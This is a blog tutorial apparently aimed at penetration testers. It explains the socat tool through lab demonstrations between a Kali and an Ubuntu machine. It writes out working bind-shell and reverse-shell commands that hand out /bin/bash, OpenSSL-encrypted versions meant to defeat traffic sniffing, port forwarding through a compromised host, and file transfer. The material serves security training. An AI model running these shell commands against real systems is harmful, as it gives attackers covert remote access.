<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Socat for Pentester</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/socat-for-pentester/" rel="bookmark"><time class="entry-date published" datetime="2021-07-30T07:46:09+00:00">July 30, 2021</time><time class="updated" datetime="2025-05-02T14:15:22+00:00">May 2, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Socat is one of those kinds of tools that either you might not know at all, or if you know then you might know all the different kinds of stuff that you can do with it. While working with it, we felt that there are guides for socat but none of them strike the right balance between the introduction and variety. This article will serve as the introduction if you have not heard about socat and as an advance if you already know something about it without being jarring.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Introduction</strong></span>
<ul>
<li><span style="color: #000000;">What is Socat?</span></li>
<li><span style="color: #000000;">Usage of Socat</span></li>
<li><span style="color: #000000;">Netcat v/s Socat</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Bind Shell</strong></span></li>
<li><span style="color: #000000;"><strong>Encrypted Bind Shell</strong></span></li>
<li><span style="color: #000000;"><strong>Reverse Shell</strong></span></li>
<li><span style="color: #000000;"><strong>Encrypted Reverse Shell</strong></span></li>
<li><span style="color: #000000;"><strong>Port Forwarding</strong></span></li>
<li><span style="color: #000000;"><strong>File Transfer</strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><strong><span style="color: #000000;">What is Socat?</span></strong></p>
<p><span style="color: #000000;">In a general sense, <strong data-start="228" data-end="242">socat acts</strong> as a relay that can transfer data independently in both directions between two data channels. These data channels can be in a form of a file, pipe, device (serial line, etc. or a pseudo-terminal), a socket (UNIX, IP4, IP6 – raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin, etc.), the GNU line editor (readline), a program, or a combination of two of these.</span></p>
<p><span style="color: #000000;"><strong>Usage of Socat</strong></span></p>
<p><span style="color: #000000;"><strong data-start="338" data-end="355">Socat handles</strong> a wide range of tasks. For example, you can use Socat as a TCP port forwarder, an external socksifier, a tool for attacking weak firewalls, or a shell interface to UNIX sockets or an IP6 relay. Additionally, it can redirect TCP-oriented programs to a serial line, logically connect serial lines on different computers, or establish a secure environment for running client or server shell scripts with network connections.</span></p>
<p><span style="color: #000000;"><strong>Netcat V/s Socat</strong></span></p>
<p><span style="color: #000000;">We all have been using Netcat for a long time ago. It has been the daily driver for many penetration testers since its initial development. It is praised as it is easy to use and it can write or read data over network connections using the TCP and UDP. Now, let’s talk about Socat. As we discussed earlier it is a relay that can be used bidirectionally. Some features are provided by Socat such as establishing Multiple connections, creating a secure channel, support of more protocols such as OpenSSL, SCTP, Socket, Tunnel, etc.</span></p>
<h3><span style="color: #800000;">Bind Shell</span></h3>
<p><span style="color: #000000;">In a general sense, a bind shell opens up a port on the remote machine that is expecting and waiting for an incoming connection. Once the user connects to the listener, a shell is provided to the user to interact.</span></p>
<p><span style="color: #000000;">Here, we will use Socat to create a listener on port 5555 on our Ubuntu machine. As soon as we execute the presented command, a listener will be created on the port. It will then wait for an incoming connection.</span><br data-start="366" data-end="369"/><span style="color: #000000;">In this setup, we run the Socat command with the</span> -d -d<span style="color: #000000;"> option, which prints fatal errors, warnings, and notices. Then, we specify the Address Type as TCP4, followed by the Facility we want to purpose, such as LISTEN. After that, we define the Port Number, separated by a colon, and the type of shell we want to provide to the guest.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat -d -d TCP4-LISTEN:5555 EXEC:/bin/bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xinqruY0ew4/YQOqVEtz6bI/AAAAAAAAx_k/18bKOpKO6-8bhvpjMt7q9WyQsw-3IJk0gCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Moving on to our other machine, i.e., Kali Linux, we will connect to our Ubuntu machine where we created the listener.</span><br data-start="823" data-end="826"/><span style="color: #000000;">To do this, we need to know the IP Address and Port Number where the listener is active. By providing the Address Type, IP Address, and Port Number, we can connect to the bash shell, as demonstrated below.</span><br data-start="1031" data-end="1034"/><span style="color: #000000;">However, the main issue with this type of session is the lack of authentication. Any user with a limited amount of information can connect to the shell and execute commands that may affect the enterprise.</span><br data-start="1238" data-end="1241"/><span style="color: #000000;">Apart from this basic authentication flaw, the communication conducted over a Bind Shell is also susceptible to sniffing attacks.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat - TCP4:192.168.1.141:5555</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Sq1dDkQY0Hg/YQOqaTnXeII/AAAAAAAAx_o/Qfd-MmPNBxIdGtAso8EXjUyzWGA9p_9BQCLcBGAsYHQ/s16000/6.png"/></span></p>
<h3><span style="color: #800000;">Encrypted Bind Shell</span></h3>
<p><span style="color: #000000;">In the previous section, we talked about the Bind Shell and its lack of security. Now, to make communication between the target user and the client user more secure, we can introduce encryption for the shell.</span><br data-start="1580" data-end="1583"/><span style="color: #000000;">For this, we will use OpenSSL. When encrypted, it will not be possible for any malicious actor in the network to sniff the traffic between the two users over a Bind Shell.</span><br data-start="1754" data-end="1757"/><span style="color: #000000;">To encrypt using OpenSSL, we first need to create a key and a certificate. In this demonstration, we create a key named</span> <span style="color: #000000;">bind_shell.key and a certificate named bind_shell.crt. The format of the certificate is x509, and it will be valid for 362 days.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VC5rGUOU8H4/YQOqeWSIxtI/AAAAAAAAx_s/1eTMymDkeP8RG-8g7wlG_MXZAtG6611FgCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">However, creating a key and a certificate is not all that is required to encrypt your Bind Shell. Before moving forward, you must use the key and certificate to create a</span> .pem<span style="color: #000000;"> file.</span><br data-start="2193" data-end="2196"/><span style="color: #000000;">We can pipe both the key and certificate using the</span> cat<span style="color: #000000;"> command to generate a</span> bind_shell.pem<span style="color: #000000;"> file, as demonstrated below.</span><br data-start="2320" data-end="2323"/><span style="color: #000000;">Then, we use the</span> bind_shell.pem<span style="color: #000000;"> file to create a listener as before. The difference now is that instead of TCP4, we are using OPENSSL.</span><br data-start="2459" data-end="2462"/><span style="color: #000000;">We created the new listener on port 9999.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat bind_shell.key bind_shell.crt &gt; bind_shell.pem
socat -OPENSSL-LISTEN:9999,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4R8j4fUueJE/YQOqineL2eI/AAAAAAAAx_w/7fAWrfb1lGw5sbky7gz1-uhxVlxIY-VcACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Now that we have created the listener on port 9999, let’s use Kali Linux to connect to the Bind Shell, just like we did earlier.<br data-start="2633" data-end="2636"/>Here, we also change the Address Type to OPENSSL, as shown in the image below.<br data-start="2714" data-end="2717"/>We see that we can successfully connect to the target machine. The difference this time is that using OpenSSL has encrypted the communication between the Kali Machine and the Ubuntu Machine.<br data-start="2907" data-end="2910"/>If a malicious actor tries to sniff the traffic between the two machines, they won’t be able to read the contents of the communication.<br/>
</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat – OPENSSL:192.168.1.141:9999,verify=0</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NwKkRcuonpo/YQOqoyz9wXI/AAAAAAAAx_0/14ugJSft7tk7iFLON5b5NKiPs2cNK7mEwCLcBGAsYHQ/s16000/9.png"/></span></p>
<h3><span style="color: #800000;">Reverse Shell</span></h3>
<p><span style="color: #000000;">The term <strong data-start="788" data-end="812">Reverse Shell refers</strong> to the method of its generation. Earlier, we discussed the bind shell, where a listener ran on the Ubuntu machine and the Kali machine connected to it. However, in a reverse shell, the shell is generated from the remote machine — in this case, the Ubuntu machine — towards the local machine, which is the Kali machine. Thus, the Ubuntu machine initiates a session to the Kali machine, meaning the listener runs on the Kali machine. Typically, attackers use this type of shell for the target machine to communicate back to the attacking machine.</span></p>
<p><span style="color: #000000;">In the environments where we have a NAT or a Firewall, the reverse shell might be the only way to gain access to the machine. To communicate between the Kali Machine and the Ubuntu Machine using socat we will first need to start a listener on the Kali machine. It is similar to the command that we ran earlier with bind shell. The difference is the STDOUT added at the end of the command to create a listener for a Reverse Shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat -d -d TCP4-LISTEN:9999 STDOUT</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KOWyNHwwIL4/YQOquHQzV1I/AAAAAAAAyAA/-Yx2hKKx4Z0FmmV0n6Ry_scDOiZTMqrugCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">Now moving to the Ubuntu Machine to start a reverse connection to connect to our listener on the Kali machine. With the Address Type, IP Address, and the Port with the type of connection that you want to establish. We see that the demonstration has the reverse bash shell to the Kali Machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat TCP4:192.168.1.2:9999 EXEC:/bin/bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WQ5NjcRWQ1Q/YQOq1vL3T1I/AAAAAAAAyAI/ZR71F2g1GVQnWRwLQRKd9SyaC_G3O3HqgCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">To see and inspect the type of connection that we have from the Ubuntu machine we see that the shell that we receive is a basic bash shell on the Kali Machine that originated from the Ubuntu Machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3Kjx9GnTz64/YQOq9fiouNI/AAAAAAAAyAQ/YXSCL0XyQaYcruklTbyu5Hudmg9LKvodgCLcBGAsYHQ/s16000/17.png"/></span></p>
<h3><span style="color: #800000;">Encrypted Reverse Shell</span></h3>
<p><span style="color: #000000;">Similar to the Bind Shell, the Reverse Shell also lack security such as the susceptibility Sniffing Attacks. We will be implementing similar techniques to encrypt the communications upon the Reverse Shell. To encrypt using OpenSSL, first, we need to create a key and a certificate associated with it. Here in this demonstration, we are creating a key by the name “ignite. the key” and the certificate by the name “ignite.crt”. The validity of the certificate is for 1000 days.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl req -newkey rsa:2048 -nodes -keyout ignite.key -x509 -days 1000 -subj '/CN=www.ignite.lab/O=Ignite Tech./C=IN' -out ignite.crt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XwnvW7MPnTg/YQOrDGltlEI/AAAAAAAAyAY/KDFpd_SFThEsLn_AUT4PXcxFKt2SgD5igCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">From our previous assessment, we know that we need to convert the key and the certificate into a .pem file. We will again use the cat command to generate the .pem file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat ignite.key ignite.crt &gt; ignite.pem</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-laDUKRfJ2Zk/YQOrHb3aJ-I/AAAAAAAAyAg/uCpbvoc9eAQJad-U6QyDrm8p-Q1P0dRUACLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">Now that we have the pem file the rest of the process is quite similar to the ones that we did with the encrypted bind shell and the reverse shell sections. We create a listener on the Kali Machine using the OPENSSL as the Address Type and the pem file as demonstrated below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O0VsbcepGJg/YQOrNvBwqbI/AAAAAAAAyAk/sbPiouK5Ilc6u77sxWcqM0Xn1AJiTF5kACLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">Over at the Ubuntu machine, we are assigned to create the reverse shell back to the listener that we created on the Kali machine. We will use the same Address Type i.e., OPENSSL. With the IP Address, Port, and the type of shell that the listener is expecting.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-frAzGI0fAfQ/YQOrTJ0mt9I/AAAAAAAAyAs/VfooLVqMXGcL-hRRXS6VyGDxZMUu2p5EwCLcBGAsYHQ/s16000/23.png"/></span></p>
<p><span style="color: #000000;">Let’s check the functionality of the shell. But while we are doing so, we will also capture the traffic between the Ubuntu Machine and Kali Machine with the help of Wireshark. We will then analyze the traffic to see if we were able to sniff the communication. We are reading the contents of the /etc/passwd file with the help of the tail command. This is an appropriate example as this is the type of data that if sniffed can result in pretty serious consequences.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q-YWjEKs3VQ/YQOraDFjU3I/AAAAAAAAyA0/oNuoCTrOegEgh1B8S0jG_oDQElmhJp7ngCLcBGAsYHQ/s16000/24.png"/></span></p>
<p><span style="color: #000000;">After running a bunch of commands through the reverse shell, we investigate the traffic captured by the Wireshark to try to make sense out of the communication. But as it is clear from the image provided below that the traffic is not readable after being encrypted by the OpenSSL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Nky8pOmauEI/YQOrenejKjI/AAAAAAAAyA4/yF1EbRn55DIw3D4eWYIrHTD1nutyXuaSACLcBGAsYHQ/s16000/25.png"/></span></p>
<h3><span style="color: #800000;">Port Forwarding</span></h3>
<p><span style="color: #000000;">Moving forward from the different types of shells, the other Address Types that Socat supports are not very different in understanding or working. Another situation where you can use Socat is for Port Forwarding. If you are familiar with the Metasploit Port Forward option, you know it is useful when you have a session on a compromised machine. When another service is accessible only through that machine, you can use the Port Forward functionality to make that service available on your local machine.</span></p>
<p><span style="color: #000000;">To demonstrate the scenario, we have a session over our Ubuntu Machine. Upon running the netstat command we were able to identify that there is an HTTP service running that is privy to the Ubuntu Machine and not to our Kali machine. With the help of socat, we forwarded the HTTP service that was running on port 8080 to the Kali Machine’s local port 1234.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XZDJfsdGd48/YQOrlECdcwI/AAAAAAAAyBA/muSmYByUZhsQUTt5Ehsf0qBH_SMD0h-oQCLcBGAsYHQ/s16000/30.png"/></span></p>
<p><span style="color: #000000;">Now that we have forwarded the service, we can access it on our Kali Machine on port 1234. Since it is an HTTP service, we used the Web Browser to take a look at the service and found a webpage as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o7QkvD3qm3M/YQOrqnKmguI/AAAAAAAAyBE/I79nnoFHfSoBULkYs006IocKXdBH3w8TwCLcBGAsYHQ/s16000/31.png"/></span></p>
<h3><span style="color: #800000;">File Transfer</span></h3>
<p><span style="color: #000000;">Now, it’s time to discover another functionality of Socat. We can transfer files by establishing a connection with Socat.</span><br data-start="343" data-end="346"/><span style="color: #000000;">For demonstration purposes, we decided to create a text file with a small message, as shown in the image below. Next, we ran Socat with the Address Type set as TCP4. We created a listener that hosts the file using the <code data-start="564" data-end="570">file</code> keyword.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat demo.txt
socat TCP4-LISTEN:443,fork file:demo.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JZnmMKRzum0/YQOruUMaIzI/AAAAAAAAyBM/enSbBPuDWPQMGBuXkskcKw0cObswVYX_wCLcBGAsYHQ/s16000/40.png"/></span></p>
<p><span style="color: #000000;">Since we created the file to transfer on our Kali machine, we will now move to the Ubuntu machine. Here, we will attempt to transfer the file <code data-start="723" data-end="733">demo.txt</code>.</span><br data-start="734" data-end="737"/><span style="color: #000000;">To do this, we need to connect to the listener created on the Kali machine. We must also specify the file name being hosted along with the <code data-start="876" data-end="884">create</code> keyword, as shown in the image below. As a result, we can see that the file gets transferred.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat TCP4:192.168.1.2:443 file:demo.txt, create
ls
cat demo.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VgoVD0U78Fg/YQOryoqIIOI/AAAAAAAAyBQ/xxg5m4uizIkrZqRay3JEEupHU4gNUz_SgCLcBGAsYHQ/s16000/41.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">While writing this article, I intended to present a mix of introductory and advanced concepts of Socat. In my opinion, it is one of those tools that most Penetration Testers have heard of. However, many seem to refrain from using it as a daily driver because they are more comfortable sticking with Netcat.</span><br data-start="1286" data-end="1289"/><span style="color: #000000;">Nevertheless, this article might provide the push needed to include Socat in your tool arsenal.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on</span> <span style="color: #0000ff;"><strong>Twitter</strong> </span><span style="color: #000000;">and </span><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
